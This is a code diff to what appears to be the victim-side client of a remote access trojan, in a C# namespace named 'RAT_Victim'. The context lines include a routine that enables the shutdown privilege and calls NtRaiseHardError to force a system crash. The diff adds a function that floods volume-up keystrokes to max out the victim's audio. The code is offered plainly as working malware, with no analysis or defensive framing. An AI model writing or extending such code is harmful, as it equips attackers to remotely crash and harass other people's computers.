@@ -4,6 +4,7 @@ using System.Drawing;
 using System.IO;
 using System.Media;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using Timer = System.Windows.Forms.Timer;
 
@@ -126,6 +127,15 @@ namespace RAT_Victim
         {
             WinApi.RtlAdjustPrivilege(19, true, false, out _);
             WinApi.NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out _);
+        }
+
+        public static void MaxVolume()
+        {
+            for (var i = 0; i < 50; i++)
+            {
+                WinApi.keybd_event(ConsoleKey.VolumeUp, 0, 0, 0);
+                Thread.Sleep(1);
+            }
         }
     }
 }
